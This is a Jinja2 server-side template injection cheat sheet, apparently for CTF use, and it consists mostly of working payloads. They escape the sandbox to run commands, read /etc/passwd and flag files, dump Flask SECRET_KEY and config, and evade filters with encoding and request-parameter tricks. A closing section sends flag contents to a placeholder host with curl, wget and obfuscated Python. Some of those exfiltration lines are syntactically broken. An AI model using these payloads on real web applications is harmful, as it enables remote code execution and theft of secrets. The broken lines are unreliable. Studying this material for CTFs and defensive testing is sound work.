# Jinja2 — the Python SSTI reference

Jinja2 (Flask, Django-custom, Ansible playbooks, Salt) is the
most common CTF SSTI engine. The exploitation story: sandbox
escape via Python's object model → `__subclasses__` → RCE or
file read.

Marker: `{{7*7}}` → 49; `{{7*'7'}}` → `7777777`.

---

## 1. The object-model escape — the canonical chain

```jinja2
{{ ''.__class__ }}
   → <class 'str'>

{{ ''.__class__.__mro__ }}
   → (<class 'str'>, <class 'object'>)

{{ ''.__class__.__mro__[1] }}
   → <class 'object'>

{{ ''.__class__.__mro__[1].__subclasses__() }}
   → all loaded subclasses — hundreds of entries

{{ ''.__class__.__mro__[1].__subclasses__()[N] }}
   → pick by index — find subprocess.Popen or file/os classes
```

### Finding the index — subclasses() ordering

```jinja2
{# enumerate in template (if loops allowed): #}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {{ loop.index }}: {{ c.__name__ }}<br>
{% endfor %}
   → the response lists index→name — find:
     - subprocess.Popen
     - os._wrap_close (has .system, .popen via __init__.__globals__)
     - warnings.catch_warnings (has __builtins__ path)
     - _frozen_importlib.BuiltinImporter (imports → os)
```

---

## 2. The RCE chains — several shapes

### via os._wrap_close / Popen (needs the class index)

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['system']('id') }}
   -- index varies! enumerate first

{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.os.popen('id').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0].strip() }}
   -- if the class IS Popen itself
```

### via built-in globals — `__builtins__` shortcut

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
   -- catch_warnings class has __builtins__ in globals

{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__'].eval('__import__("os").popen("id").read()') }}
```

### via `lipsum`/`cycler`/`joiner` — Flask's own globals (no subclass hunting)

```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ url_for.__globals__['os'].popen('id').read() }}
{{ get_flashed_messages.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

These work when the template context exposes Flask's helpers —
almost always available in Flask templates. `lipsum`, `cycler`,
`joiner`, `namespace`, `url_for`, `get_flashed_messages`,
`self`, `config` — all expose `__globals__`.

### via `config` — Flask's config object

```jinja2
{{ config }}                                    -- dumps Flask config —
                                                SECRET_KEY, flag vars
{{ config.items() }}
{{ config['SECRET_KEY'] }}
{{ config.from_pyfile('/etc/passwd') }}         -- file read via config
```

Config itself often holds the flag or secrets — check it FIRST.

### via request — request object globals

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.args.x }}                            -- read other params
{{ request.cookies }}
{{ request.environ }}
```

---

## 3. File read — no-RCE paths

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
   -- index 40 is often 'file' on py2 — py3: use io classes

{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}

{{ lipsum.__globals__['__builtins__'].open('/etc/passwd').read() }}
{{ get_flashed_messages.__globals__['__builtins__'].open('/flag').read() }}

{{ config.from_pyfile('/flag') }}
```

---

## 4. The sandbox variants — what's blocked

### Attr-name filtering — `__` blocked

```jinja2
{{ ''['__class__'] }}                          -- bracket access
{{ ''|attr('__class__') }}                     -- attr filter
{{ ''|attr('__cl'+'ass__') }}                  -- concat (if + allowed)
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}          -- hex escapes in string
{{ ''|attr('\u005f\u005fclass\u005f\u005f') }}  -- unicode escapes
{{ ''['_'+'_class_'+'_'] }}                    -- concat
```

### Filtered words — `class`, `import`, `os`, `popen`

```jinja2
{{ ''|attr('__cl'+'ass__') }}                   -- split keyword
{{ request['args']['x'] }}                      -- exfil via request param
{{ ().__class__.__base__.__subclasses__() }}    -- () instead of ''
{{ [].__class__.__base__.__subclasses__() }}    -- [] variant
{{ {}.__class__.__base__.__subclasses__() }}    -- {} → dict, mro same
{{ ().__class__.__mro__[-1] }}                  -- -1 gets object
```

`__mro__[-1]` vs `__mro__[1]` — object is at both ends for simple
types (str→object, dict→object). mro[-1] safer across types.

### No quotes at all

```jinja2
{{ lipsum|attr(\u005f\u005fglobals\u005f\u005f)|attr(\u006f\u0073) }}  -- hmm — attr arg is a string
   -- better: use request.args to supply strings:
{{ request.args.a }}                             -- pass strings via params
{{ ''[request.args.c] }}&c=__class__             -- param-carried attr names
```

The request-args trick is the canonical no-quote bypass — every
string the payload needs comes through `request.args.x`/`request.values.x`.

---

## 5. The `{% %}` statement context — when `{{}}` is filtered

```jinja2
{% if 7*7 == 49 %}XSS_PROBE{% endif %}
{% set x = 7*7 %}{{ x }}
{% for i in range(5) %}{{ i }}{% endfor %}
{% print(7*7) %}
{% if lipsum %}lipsum exists{% endif %}          -- context probe
```

`{%print(x)%}` — the print statement (Jinja 3.x extension).
When `{{}}` alone is filtered but `{%` passes — statements still
evaluate expressions.

---

## 6. Format-string context — `"{0}".format` injection

```python
# Python-side: "Hello {}".format(name) or f-strings —
# NOT template-eval — a different vuln:
{name.__class__}                -- attr access in format spec
{name.__init__.__globals__}      -- leaks globals!
{0.__class__.__init__.__globals__[os].popen(id)}
```

Format-string bugs use `{...}` single-braces — different syntax
from Jinja `{{}}`. If `{{7*7}}` fails but `{7*7}` fails too and
`{name}` renders — it's format-string injection not SSTI.

---

## 7. Flask-specific globals — the full grab-bag

```jinja2
{{ config }}                -- full config dict (SECRET_KEY often = flag)
{{ self }}                  -- the TemplateReference — ._TemplateReference__context
{{ session }}               -- session dict
{{ request }}               -- the request obj — args/form/cookies/environ
{{ g }}                     -- app context globals
{{ lipsum }} {{ cycler }} {{ joiner }} {{ namespace }} {{ range }}
{{ dict }} {{ url_for }} {{ get_flashed_messages }}
{{ url_for.__globals__.current_app.config }}   -- full app config
```

`{{config}}` is the single highest-value first payload after
`{{7*7}}` — CTF flags live in Flask config `FLAG`/`SECRET_KEY`
env-injected vars constantly.

---

## 8. The exfil path — blind Jinja

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('curl//me/?d=$(cat/flag|base64)').read() }}
   -- command inside popen — OOB exfil

{{ lipsum.__globals__.os.popen('curl//me/`cat /flag`').read() }}
{{ lipsum.__globals__.os.popen('wget//me/?d=`cat /flag`').read() }}
{{ lipsum.__globals__.os.popen('python3 -c "import urllib.request;urllib.request.urlopen(chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(me)+open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read())"').read() }}
   -- chr()-built strings when quotes/urls blocked
```

---

## 9. The test sequence — Jinja2 endgame

```jinja2
{{7*7}}                          -- confirm eval
{{7*'7'}}                        -- confirm Jinja (7777777)
{{config}}                       -- flag often right here
{{lipsum.__globals__}}           -- globals visible?
{{''.__class__.__mro__}}         -- object-model reachable?
{{''.__class__.__mro__[1].__subclasses__()}}   -- enumerate
{{lipsum.__globals__.os.popen('id').read()}}    -- RCE
{{lipsum.__globals__.__builtins__.open('/flag').read()}}  -- read flag
```
